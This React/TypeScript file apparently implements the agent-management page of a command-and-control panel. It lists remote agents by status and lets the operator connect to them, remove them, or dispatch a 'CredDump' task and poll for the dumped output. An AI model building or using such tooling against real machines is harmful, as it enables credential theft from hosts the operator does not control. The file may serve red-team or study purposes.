import { useState, useEffect, useRef, useCallback } from 'react';
import { useTranslation } from 'react-i18next';
import { Tabs } from '@heroui/react';
import { getAgents, getAgent, deleteAgent } from '../../api/agents';
import { createTask, getTask } from '../../api/tasks';
import { AgentTable } from './AgentTable';
import { AgentDetailModal } from './AgentDetailModal';
import { useAgent } from '../../contexts/AgentContext';
import { useDialog } from '../../hooks/useDialog';
import type { AgentListItem, AgentDetail } from '../../types/models';

export default function AgentsPage() {
  const { t } = useTranslation();
  const { agentId, selectAgent, disconnect: disconnectAgent } = useAgent();
  const { confirm, DialogComponent } = useDialog();
  const [agents, setAgents] = useState<AgentListItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState<string>('online');
  const [modalOpen, setModalOpen] = useState(false);
  const [modalAgent, setModalAgent] = useState<AgentDetail | null>(null);
  const [modalLoading, setModalLoading] = useState(false);
  const contextAgentRef = useRef<string | null>(null);

  const loadAgents = useCallback(async () => {
    try {
      const statusParam = tab === 'all' ? undefined : tab;
      const res = await getAgents(1, 100, statusParam);
      setAgents(res.agents);
    } catch { /* ignore */ }
    finally { setLoading(false); }
  }, [tab]);

  useEffect(() => {
    loadAgents();
    const timer = setInterval(loadAgents, 10000);
    return () => clearInterval(timer);
  }, [loadAgents]);

  const handleTabChange = useCallback((key: string) => {
    setTab(key);
    setLoading(true);
  }, []);

  const handleContextMenu = (e: React.MouseEvent) => {
    const row = (e.target as HTMLElement).closest('[role="row"][data-key]');
    contextAgentRef.current = row ? row.getAttribute('data-key') : null;
  };

  const handleConnect = () => {
    const id = contextAgentRef.current;
    if (id) selectAgent(id);
  };

  const handleDisconnect = () => {
    disconnectAgent();
  };

  const handleViewDetails = async () => {
    const id = contextAgentRef.current;
    if (!id) return;
    setModalOpen(true);
    setModalLoading(true);
    setModalAgent(null);
    try {
      const detail = await getAgent(id);
      setModalAgent(detail);
    } catch { /* ignore */ }
    finally { setModalLoading(false); }
  };

  const handleRemove = async () => {
    const id = contextAgentRef.current;
    if (!id) return;
    const { confirmed } = await confirm(t('agents.removeConfirm'));
    if (!confirmed) return;
    await deleteAgent(id);
    loadAgents();
  };

  const handleCredDumpFromMenu = async () => {
    // Open detail modal — user clicks "Dump Credentials" button there
    await handleViewDetails();
  };

  const handleCredDump = async (): Promise<string> => {
    const id = contextAgentRef.current;
    if (!id) throw new Error('No agent selected');

    const task = await createTask({ agentId: id, commandType: 'CredDump', command: '' });
    const taskId = task.id;

    // Poll for result (up to 120s)
    for (let i = 0; i < 40; i++) {
      await new Promise(r => setTimeout(r, 3000));
      try {
        const t = await getTask(taskId);
        if (t.status === 'Completed') return t.output || '[No output]';
        if (t.status === 'Failed') return `[Failed] ${t.error || ''}`;
      } catch { /* retry */ }
    }
    throw new Error('Timed out waiting for agent response');
  };

  return (
    <div className="space-y-3">
      <Tabs
        selectedKey={tab}
        onSelectionChange={(key) => handleTabChange(String(key))}
      >
        <Tabs.ListContainer className="flex justify-center">
          <Tabs.List aria-label={t('agents.agentFilters')} className="mx-auto w-md">
            <Tabs.Tab id="all">{t('agents.all')}<Tabs.Indicator /></Tabs.Tab>
            <Tabs.Tab id="online">{t('agents.online')}<Tabs.Indicator /></Tabs.Tab>
            <Tabs.Tab id="offline">{t('agents.offline')}<Tabs.Indicator /></Tabs.Tab>
          </Tabs.List>
        </Tabs.ListContainer>
        <Tabs.Panel id="all">
          <AgentTable agents={agents} loading={loading} contextAgentId={contextAgentRef.current} connectedAgentId={agentId} onContextMenu={handleContextMenu} onConnect={handleConnect} onDisconnect={handleDisconnect} onViewDetails={handleViewDetails} onRemove={handleRemove} onCredDump={handleCredDumpFromMenu} />
        </Tabs.Panel>
        <Tabs.Panel id="online">
          <AgentTable agents={agents} loading={loading} contextAgentId={contextAgentRef.current} connectedAgentId={agentId} onContextMenu={handleContextMenu} onConnect={handleConnect} onDisconnect={handleDisconnect} onViewDetails={handleViewDetails} onRemove={handleRemove} onCredDump={handleCredDumpFromMenu} />
        </Tabs.Panel>
        <Tabs.Panel id="offline">
          <AgentTable agents={agents} loading={loading} contextAgentId={contextAgentRef.current} connectedAgentId={agentId} onContextMenu={handleContextMenu} onConnect={handleConnect} onDisconnect={handleDisconnect} onViewDetails={handleViewDetails} onRemove={handleRemove} onCredDump={handleCredDumpFromMenu} />
        </Tabs.Panel>
      </Tabs>

      <AgentDetailModal
        isOpen={modalOpen}
        onOpenChange={setModalOpen}
        agent={modalAgent}
        loading={modalLoading}
        onCredDump={handleCredDump}
      />

      {DialogComponent}
    </div>
  );
}
